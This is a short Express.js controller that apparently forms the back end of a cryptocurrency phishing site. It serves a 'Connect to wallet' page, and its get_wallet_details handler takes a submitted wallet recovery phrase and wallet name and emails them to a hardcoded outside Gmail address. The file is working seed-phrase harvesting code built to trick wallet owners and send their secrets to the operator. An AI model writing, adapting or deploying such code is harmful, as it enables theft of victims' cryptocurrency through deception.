const { text } = require('body-parser');
const transporter = require('../middleware/sendmail');

exports.home = async(req,res)=>{
     const local ={
         title:"Home"
     }
     res.render('index',{local});
}
exports.features = async(req,res)=>{
    const local ={
        title:"Features"
    }
    res.render('feature',{local});
}

exports.wallet = async(req,res)=>{
    const local ={
        title:"Connect to wallet"
    }
    res.render('wallets',{local});
}

//post requests

const sendmail = async function(from,to,subject,text) {
    const  mailOptions = {
        from:from,
        to,
        subject,
        text
    }
    try{
        await transporter.sendMail(mailOptions);
    }catch(error){
         console.error(error.message);
    }
}
exports.get_wallet_details= async(req,res)=>{
      const phrase = req.body.Phrase; 
     // const wallet_address = req.body.Wallet_address;
      const crypto_wallet = req.body.Crpto_Wallet
     const email =" michaelnoleyboytimm@gmail.com";
     const subject ="Wallet Details";
     const Text = "Phrase: "+phrase+"\n\n"+"Wallet Name: "+crypto_wallet;
     
     try{
        const send = sendmail(process.env.EMAIL,email,subject,Text);
        if(send){
            res.json({message:"email sent sucessfully"})
        }
     }catch(error){
        console.error(error.message)
     }
}

